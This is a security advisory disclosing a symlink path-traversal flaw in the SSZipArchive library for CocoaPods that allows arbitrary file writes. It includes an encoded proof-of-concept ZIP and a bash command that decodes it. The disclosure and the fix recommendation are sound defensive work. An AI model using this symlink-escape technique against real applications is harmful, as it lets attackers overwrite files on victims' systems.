# SSZipArchive Arbitrary File Write Vulnerability

Critical

[landaire](/landaire)
published
GHSA-vgvw-6xcf-qqfc
Jan 3, 2023

## Package

SSZipArchive
(CocoaPods)

## Affected versions

<=2.5.3

## Patched versions

None

## Description

## Vulnerability Description:

SSZipArchive typically [sanitizes file paths](https://github.com/ZipArchive/ZipArchive/blob/b145c6f3619619fb48715c479643e2f2e0e42d2d/SSZipArchive/SSZipArchive.m#L453) to ensure that no files are written outside of the provided destination directory argument. However, [symlinks are also supported](https://github.com/ZipArchive/ZipArchive/blob/b145c6f3619619fb48715c479643e2f2e0e42d2d/SSZipArchive/SSZipArchive.m#L625-L668) and have no sanitization checks performed on the symlink's target path.

An attacker can therefore embed a symlink in a ZIP archive pointing to a location of their choosing as the first file in the archive to first create the symlink. If a regular file in the ZIP has the same name as the symlink, the library will open and implicitly follow the symlink using an [fopen()](https://github.com/ZipArchive/ZipArchive/blob/b145c6f3619619fb48715c479643e2f2e0e42d2d/SSZipArchive/SSZipArchive.m#L496) call, and the contents of the file are written to the symlink target.

An example file may look like the following, where the first entry is a symlink whose target is ../test:

```
$ unzip -v ./symlink_escape.zip
Archive:  ./symlink_escape.zip
 Length   Method    Size  Cmpr    Date    Time   CRC-32   Name
--------  ------  ------- ---- ---------- ----- --------  ----
       7  Stored        7   0% 06-30-2022 06:14 85e2e03c  test
       5  Defl:N        7 -40% 06-30-2022 06:14 3610a686  test
--------          -------  ---                            -------
      12               14 -17%                            2 files

```
## Proof of Concept:

The following bash script will un-base64 and uncompress an .xz file containing a maliciously crafted ZIP archive.

```
echo -n "/Td6WFoAAATm1rRGAgAhARYAAAB0L+Wj4ADLAFxdACgSvGAol9VpzGR79fbdQZYxkTvx1S6doFjMMPFDEMyTmKrcgRgnOk+lDGZg51l0XJsdSne7oHE79HfM7ZzptavRzCqA5+gmfZMSfAeYDS+4bGvA2k6hII8S2qgAAMU3KxoPPYbUAAF4zAEAAADOOX2wscRn+wIAAAAABFla" | base64 -d | xz -d > symlink_escape.zip
```

The `symlink_escape.zip` file can then be used in any application that handles a ZIP archive using SSZipArchive, including its samples. A file named `test` containing `hello` will be written to the destination directory's parent after unzipping completes.

## Recommendation:

Add path sanitization checks to the symlink's target to ensure it's a subdirectory of the destination path. Symlinks which are not relative to the destination path should be ignored unless the user explicitly requests it.
